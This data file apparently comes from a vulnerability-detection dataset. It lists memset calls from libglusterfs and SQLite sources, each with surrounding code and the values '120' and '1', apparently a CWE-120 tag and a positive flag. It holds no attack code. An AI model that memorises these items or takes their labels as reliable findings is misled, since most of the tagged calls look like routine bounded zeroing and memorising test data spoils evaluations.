2021\cslim\test\libglusterfs\trie.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\trie.cpp.c,"memset(nodevec->nodes, 0, sizeof (*nodevec->nodes) * nodevec->cnt);",120,1,"trienodevec_clear (struct trienodevec *nodevec)
{
        memset(nodevec->nodes, 0, sizeof (*nodevec->nodes) * nodevec->cnt);
}

"
2021\cslim\test\libglusterfs\xlator.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\xlator.cpp.c,"memset (xl->mem_acct, 0, sizeof(struct mem_acct));",120,1,"                return -1;
        }
        memset (xl->mem_acct, 0, sizeof(struct mem_acct));

        xl->mem_acct->num_types = num_types;
"
2021\cslim\test\libglusterfs\xlator.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\xlator.cpp.c,"memset (&xl->mem_acct->rec[i], 0, sizeof(struct mem_acct_rec));",120,1,"
        for (i = 0; i < num_types; i++) {
                memset (&xl->mem_acct->rec[i], 0, sizeof(struct mem_acct_rec));
                ret = pthread_mutex_init (&(xl->mem_acct->rec[i].lock), 0);
                if (ret) {
"
2021\cslim\test\libglusterfs\xlator.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\xlator.cpp.c,"memset (loc, 0, sizeof (*loc));",120,1,"        }

        memset (loc, 0, sizeof (*loc));
}

"
2021\cslim\test\sqlite312-cpp\shell.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\shell.cpp.c,"memset(&sCtx, 0, sizeof(sCtx));",120,1,"    zTable = azArg[2];
    seenInterrupt = 0;
    memset(&sCtx, 0, sizeof(sCtx));
    open_db(p, 0);
    nSep = strlen30(p->colSeparator);
"
2021\cslim\test\sqlite312-cpp\shell.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\shell.cpp.c,"memset(data, 0, sizeof(*data));",120,1,"
static void main_init(ShellState *data) {
  memset(data, 0, sizeof(*data));
  data->normalMode = data->cMode = data->mode = 2;
  data->autoExplain = 1;
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&sLocal, 0, sizeof(sLocal));",120,1,"

  memset(&sLocal, 0, sizeof(sLocal));

  x = *p;
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&tx, 0, sizeof(tx));",120,1,"        sqlite3_int64 day;
        if( !(sqlite3CtypeMap[(unsigned char)(*z2)]&0x04) ) z2++;
        memset(&tx, 0, sizeof(tx));
        if( parseHhMmSs(z2, &tx) ) break;
        computeJD(&tx);
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(p, 0, sizeof(*p));",120,1,"  const unsigned char *z;
  int eType;
  memset(p, 0, sizeof(*p));
  if( argc==0 )
{
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&mem0, 0, sizeof(mem0));",120,1,"    sqlite3MemSetDefault();
  }
  memset(&mem0, 0, sizeof(mem0));
  mem0.mutex = sqlite3MutexAlloc(3);
  if( sqlite3Config.pScratch && sqlite3Config.szScratch>=100
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"if( rc!=0 ) memset(&mem0, 0, sizeof(mem0));",120,1,"  }
  rc = sqlite3Config.m.xInit(sqlite3Config.m.pAppData);
  if( rc!=0 ) memset(&mem0, 0, sizeof(mem0));
  return rc;
}
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(p, 0, (size_t)n);",120,1,"{

    memset(p, 0, (size_t)n);
  }
  return p;
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"if( p ) memset(p, 0, (size_t)n);",120,1,"  ;
  p = sqlite3DbMallocRaw(db, n);
  if( p ) memset(p, 0, (size_t)n);
  return p;
}
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&m, 0, sizeof(m));",120,1,"
  Mem m;
  memset(&m, 0, sizeof(m));
  m.db = db;
  sqlite3VdbeMemSetStr(&m, z, nByte, enc, ((sqlite3_destructor_type)0));
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(new_ht, 0, new_size*sizeof(struct _ht));",120,1,"  pH->ht = new_ht;
  pH->htsize = new_size = sqlite3MallocSize(new_ht)/sizeof(struct _ht);
  memset(new_ht, 0, new_size*sizeof(struct _ht));
  for(elem=pH->first, pH->first=0; elem; elem = next_elem)
{
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&fileId, 0, sizeof(fileId));",120,1,"  }
# 28812 ""sqlite3.c""
  memset(&fileId, 0, sizeof(fileId));
  fileId.dev = statbuf.st_dev;

"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(pInode, 0, sizeof(*pInode));",120,1,"      return 7;
    }
    memset(pInode, 0, sizeof(*pInode));
    memcpy(&pInode->fileId, &fileId, sizeof(fileId));
    pInode->nRef = 1;
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(pFile, 0, sizeof(unixFile));",120,1,"  ;
  sqlite3_free(pFile->pUnused);
  memset(pFile, 0, sizeof(unixFile));
  return 0;
}
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&((char*)pBuf)[got], 0, amt-got);",120,1,"    storeLastErrno(pFile, 0);

    memset(&((char*)pBuf)[got], 0, amt-got);
    return (10 | (2<<8));
  }
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&f, 0, sizeof(f));",120,1,"

    memset(&f, 0, sizeof(f));
    f.l_type = lockType;
    f.l_whence = 0;
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(pShmNode, 0, sizeof(*pShmNode)+nShmFilename);",120,1,"      goto shm_open_err;
    }
    memset(pShmNode, 0, sizeof(*pShmNode)+nShmFilename);
    zShmFilename = pShmNode->zFilename = (char*)&pShmNode[1];

"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(pMem, 0, szRegion);",120,1,"          goto shmpage_out;
        }
        memset(pMem, 0, szRegion);
      }

"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(p, 0, sizeof(unixFile));",120,1,"  }

  memset(p, 0, sizeof(unixFile));

  if( eType==0x00000100 )
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(zBuf, 0, nBuf);",120,1,"  ((void) (0));
# 33660 ""sqlite3.c""
  memset(zBuf, 0, nBuf);
  randomnessPid = (pid_t)getpid();

"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(p->u.apSub, 0, sizeof(p->u.apSub));",120,1,"    }else{
      memcpy(aiValues, p->u.aHash, sizeof(p->u.aHash));
      memset(p->u.apSub, 0, sizeof(p->u.apSub));
      p->iDivisor = (p->iSize + ((((512 -(3*sizeof(u32)))/sizeof(Bitvec*))*sizeof(Bitvec*))/sizeof(Bitvec *)) - 1)/((((512 -(3*sizeof(u32)))/sizeof(Bitvec*))*sizeof(Bitvec*))/sizeof(Bitvec *));
      rc = sqlite3BitvecSet(p, i);
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(p->u.aHash, 0, sizeof(p->u.aHash));",120,1,"    u32 *aiValues = pBuf;
    memcpy(aiValues, p->u.aHash, sizeof(p->u.aHash));
    memset(p->u.aHash, 0, sizeof(p->u.aHash));
    p->nSet = 0;
    for(j=0; j<((((512 -(3*sizeof(u32)))/sizeof(Bitvec*))*sizeof(Bitvec*))/sizeof(u32)); j++)
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(p, 0, sizeof(PCache));",120,1,"{

  memset(p, 0, sizeof(PCache));
  p->szPage = 1;
  p->szExtra = szExtra;
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(pPgHdr, 0, sizeof(PgHdr));",120,1,"  pPgHdr = (PgHdr*)pPage->pExtra;
  ((void) (0));
  memset(pPgHdr, 0, sizeof(PgHdr));
  pPgHdr->pPage = pPage;
  pPgHdr->pData = pPage->pBuf;
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(pPgHdr->pExtra, 0, pCache->szExtra);",120,1,"  pPgHdr->pData = pPage->pBuf;
  pPgHdr->pExtra = (void *)&pPgHdr[1];
  memset(pPgHdr->pExtra, 0, pCache->szExtra);
  pPgHdr->pCache = pCache;
  pPgHdr->pgno = pgno;
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(pPage1->pBuf, 0, pCache->szPage);",120,1,"

        memset(pPage1->pBuf, 0, pCache->szPage);
        pgno = 1;
      }
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(a, 0, sizeof(a));",120,1,"  PgHdr *a[32], *p;
  int i;
  memset(a, 0, sizeof(a));
  while( pIn )
{
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&(pcache1_g), 0, sizeof((pcache1_g)));",120,1,"  (void)(NotUsed);
  ((void) (0));
  memset(&(pcache1_g), 0, sizeof((pcache1_g)));
# 42779 ""sqlite3.c""
  (pcache1_g).separateCache = sqlite3Config.pPage==0
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(aBucket, 0, sizeof(aBucket));",120,1,"  struct RowSetEntry *pNext, *aBucket[40];

  memset(aBucket, 0, sizeof(aBucket));
  while( pIn )
{
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(zHeader, 0, sizeof(aJournalMagic)+4);",120,1,"    sqlite3Put4byte((u8*)&zHeader[sizeof(aJournalMagic)],0xffffffff);
  }else{
    memset(zHeader, 0, sizeof(aJournalMagic)+4);
  }

"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(pTmp, 0, szPage);",120,1,"
        char *pTmp = pPager->pTmpSpace;
        memset(pTmp, 0, szPage);
        ;
        ;
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(pPager->dbFileVers, 0xff, sizeof(pPager->dbFileVers));",120,1,"
# 46932 ""sqlite3.c""
      memset(pPager->dbFileVers, 0xff, sizeof(pPager->dbFileVers));
    }else{
      u8 *dbFileVers = &((u8*)pPg->pData)[24];
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(pDest, 0, N);",120,1,"
  int rc = 0;
  memset(pDest, 0, N);
  ((void) (0));

"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(p->pExtra, 0, pPager->nExtra);",120,1,"    pPager->pMmapFreelist = p->pDirty;
    p->pDirty = 0;
    memset(p->pExtra, 0, pPager->nExtra);
  }else{
    *ppPage = p = (PgHdr *)sqlite3MallocZero(sizeof(PgHdr) + pPager->nExtra);
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(dbFileVers, 0, sizeof(dbFileVers));",120,1,"        }
      }else{
        memset(dbFileVers, 0, sizeof(dbFileVers));
      }

"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(pPg->pData, 0, pPager->pageSize);",120,1,"        sqlite3EndBenignMalloc();
      }
      memset(pPg->pData, 0, pPager->pageSize);
      ;
    }else{
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&aNew[nCurrent], 0, (nSavepoint-nCurrent) * sizeof(PagerSavepoint));",120,1,"    return 7;
  }
  memset(&aNew[nCurrent], 0, (nSavepoint-nCurrent) * sizeof(PagerSavepoint));
  pPager->aSavepoint = aNew;

"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&aFrame[8], 0, 16);",120,1,"    sqlite3Put4byte(&aFrame[20], aCksum[1]);
  }else{
    memset(&aFrame[8], 0, 16);
  }
}
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset((void *)&aPgno[iLimit+1], 0, nByte);",120,1,"
  nByte = (int)((char *)aHash - (char *)&aPgno[iLimit+1]);
  memset((void *)&aPgno[iLimit+1], 0, nByte);
# 52351 ""sqlite3.c""
}
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset((void*)&aPgno[1], 0, nByte);",120,1,"
      int nByte = (int)((u8 *)&aHash[(4096*2)] - (u8 *)&aPgno[1]);
      memset((void*)&aPgno[1], 0, nByte);
    }

"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&pWal->hdr, 0, sizeof(WalIndexHdr));",120,1,"  ;

  memset(&pWal->hdr, 0, sizeof(WalIndexHdr));

  rc = sqlite3OsFileSize(pWal->pWalFd, &nSize);
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(aSub, 0, sizeof(aSub));",120,1,"  struct Sublist aSub[13];

  memset(aSub, 0, sizeof(aSub));
  ((void) (0));
  ((void) (0));
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(p, 0, nByte);",120,1,"    return 7;
  }
  memset(p, 0, nByte);
  p->nSegment = nSegment;

"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&data[iCellFirst], 0, cbrk-iCellFirst);",120,1,"  data[hdr+2] = 0;
  data[hdr+7] = 0;
  memset(&data[iCellFirst], 0, cbrk-iCellFirst);
  ((void) (0));
  if( cbrk-iCellFirst!=pPage->nFree )
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&data[iStart], 0, iSize);",120,1,"{

    memset(&data[iStart], 0, iSize);
  }

"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&data[hdr], 0, pBt->usableSize - hdr);",120,1,"{

    memset(&data[hdr], 0, pBt->usableSize - hdr);
  }
  data[hdr] = (char)flags;
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&data[hdr+1], 0, 4);",120,1,"  data[hdr] = (char)flags;
  first = hdr + ((flags&0x08)==0 ? 12 : 8);
  memset(&data[hdr+1], 0, 4);
  data[hdr+7] = 0;
  ((&data[hdr+5])[0] = (u8)((pBt->usableSize)>>8), (&data[hdr+5])[1] = (u8)(pBt->usableSize));
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(pBt->pTmpSpace, 0, 8);",120,1,"{

      memset(pBt->pTmpSpace, 0, 8);
      pBt->pTmpSpace += 4;
    }
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&data[24], 0, 100-24);",120,1,"  data[22] = 32;
  data[23] = 32;
  memset(&data[24], 0, 100-24);
  zeroPage(pP1, 0x01|0x08|0x04 );
  pBt->btsFlags |= 0x0002;
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(p, 0, __builtin_offsetof (BtCursor, iPage));",120,1,"{

  memset(p, 0, __builtin_offsetof (BtCursor, iPage));
}

"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(pCur->aOverflow, 0, nOvfl*sizeof(Pgno));",120,1,"{

        memset(pCur->aOverflow, 0, nOvfl*sizeof(Pgno));
        pCur->curFlags |= 0x04;
      }
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(pPage->aData, 0, pPage->pBt->pageSize);",120,1,"      goto freepage_out;
    }
    memset(pPage->aData, 0, pPage->pBt->pageSize);
  }

"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(pPayload, 0, n);",120,1,"      memcpy(pPayload, pSrc, n);
    }else{
      memset(pPayload, 0, n);
    }
    nPayload -= n;
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(abDone, 0, sizeof(abDone));",120,1,"  CellArray b;

  memset(abDone, 0, sizeof(abDone));
  b.nCell = 0;
  b.apCell = 0;
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(apOld, 0, (i+1)*sizeof(MemPage*));",120,1,"{

      memset(apOld, 0, (i+1)*sizeof(MemPage*));
      goto balance_cleanup;
    }
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&b.szCell[b.nCell], 0, sizeof(b.szCell[0])*(limit+pOld->nOverflow));",120,1,"    }
# 63004 ""sqlite3.c""
    memset(&b.szCell[b.nCell], 0, sizeof(b.szCell[0])*(limit+pOld->nOverflow));
    if( pOld->nOverflow>0 )
{
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&b, 0, sizeof(b));",120,1,"

  memset(&b, 0, sizeof(b));
  b.pSrcDb = pFrom->db;
  b.pSrc = pFrom;
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&pMem->z[pMem->n], 0, pMem->u.nZero);",120,1,"    }

    memset(&pMem->z[pMem->n], 0, pMem->u.nZero);
    pMem->n += pMem->u.nZero;
    pMem->flags &= ~(0x4000|0x0200);
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&ctx, 0, sizeof(ctx));",120,1,"    ((void) (0));
    ((void) (0));
    memset(&ctx, 0, sizeof(ctx));
    memset(&t, 0, sizeof(t));
    t.flags = 0x0001;
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&t, 0, sizeof(t));",120,1,"    ((void) (0));
    memset(&ctx, 0, sizeof(ctx));
    memset(&t, 0, sizeof(t));
    t.flags = 0x0001;
    t.db = pMem->db;
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(x.pSpace, 0, x.nFree);",120,1,"{

    memset(x.pSpace, 0, x.nFree);
    ((void) (0));
  }
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"if( p->aOnceFlag ) memset(p->aOnceFlag, 0, p->nOnceFlag);",120,1,"    p->rc = 7;
  }
  if( p->aOnceFlag ) memset(p->aOnceFlag, 0, p->nOnceFlag);
  closeAllCursors(p);
  if( p->magic!=0xbdf20da3 )
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(pNew, 0, sizeof(*pNew));",120,1,"  pNew = sqlite3_malloc( sizeof(*pNew) );
  if( pNew==0 ) return 0;
  memset(pNew, 0, sizeof(*pNew));
  memcpy(pNew, pOrig, __builtin_offsetof (Mem, zMalloc));
  pNew->flags &= ~0x0400;
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(pMem->z, 0, nByte);",120,1,"{

      memset(pMem->z, 0, nByte);
    }
  }
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&utf8, 0, sizeof(utf8));",120,1,"{

          memset(&utf8, 0, sizeof(utf8));
          utf8.db = db;
          sqlite3VdbeMemSetStr(&utf8, pVar->z, pVar->n, enc, ((sqlite3_destructor_type)0));
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(pCx, 0, sizeof(VdbeCursor));",120,1,"
    p->apCsr[iCur] = pCx = (VdbeCursor*)pMem->z;
    memset(pCx, 0, sizeof(VdbeCursor));
    pCx->eCurType = eCurType;
    pCx->iDb = iDb;
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&sMem, 0, sizeof(sMem));",120,1,"{

        memset(&sMem, 0, sizeof(sMem));
        rc = sqlite3VdbeMemFromBtree(pCrsr, 0, aOffset[0], !pC->isTable, &sMem);
        if( rc!=0 ) goto abort_due_to_error;
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(p->aOnceFlag, 0, p->nOnceFlag);",120,1,"
  pOp = &aOp[-1];
  memset(p->aOnceFlag, 0, p->nOnceFlag);

  break;
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&sContext, 0, sizeof(sContext));",120,1,"  pModule = pVtab->pModule;
  ((void) (0));
  memset(&sContext, 0, sizeof(sContext));
  sContext.pOut = pDest;
  ((pDest)->flags = ((pDest)->flags&~(0x81ff|0x4000))|0x0001);
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(pParse, 0, sizeof(Parse));",120,1,"
  do {
    memset(pParse, 0, sizeof(Parse));
    pParse->db = db;
    sqlite3DbFree(db, zErr);
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(pReadr, 0, sizeof(PmaReader));",120,1,"  if( pReadr->aMap ) sqlite3OsUnfetch(pReadr->pFd, 0, pReadr->aMap);
  vdbeIncrFree(pReadr->pIncr);
  memset(pReadr, 0, sizeof(PmaReader));
}
# 82323 ""sqlite3.c""
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(pTask, 0, sizeof(SortSubtask));",120,1,"    sqlite3OsCloseFree(pTask->file2.pFd);
  }
  memset(pTask, 0, sizeof(SortSubtask));
}
# 82938 ""sqlite3.c""
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(p, 0, sizeof(PmaWriter));",120,1,"{

  memset(p, 0, sizeof(PmaWriter));
  p->aBuffer = (u8*)sqlite3Malloc(nBuf);
  if( !p->aBuffer )
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&writer, 0, sizeof(PmaWriter));",120,1,"
  ;
  memset(&writer, 0, sizeof(PmaWriter));
  ((void) (0));

"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(p, 0, sizeof(MemJournal));",120,1,"  MemJournal copy = *p;

  memset(p, 0, sizeof(MemJournal));
  rc = sqlite3OsOpen(copy.pVfs, copy.zJournal, pReal, copy.flags, 0);
  if( rc==0 )
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&w, 0, sizeof(w));",120,1,"
    Walker w;
    memset(&w, 0, sizeof(w));
    w.xExprCallback = incrAggDepth;
    w.u.n = N;
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&nc, 0, sizeof(nc));",120,1,"

  memset(&nc, 0, sizeof(nc));
  nc.pParse = pParse;
  nc.pSrcList = pSelect->pSrc;
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&sNC, 0, sizeof(sNC));",120,1,"

    memset(&sNC, 0, sizeof(sNC));
    sNC.pParse = pParse;
    if( sqlite3ResolveExprNames(&sNC, p->pLimit) ||
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&sSrc, 0, sizeof(sSrc));",120,1,"  ((void) (0));
  memset(&sNC, 0, sizeof(sNC));
  memset(&sSrc, 0, sizeof(sSrc));
  sSrc.nSrc = 1;
  sSrc.a[0].zName = pTab->zName;
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(pNew, 0, sizeof(Expr));",120,1,"{

    memset(pNew, 0, sizeof(Expr));
    pNew->op = (u8)op;
    pNew->iAgg = -1;
"
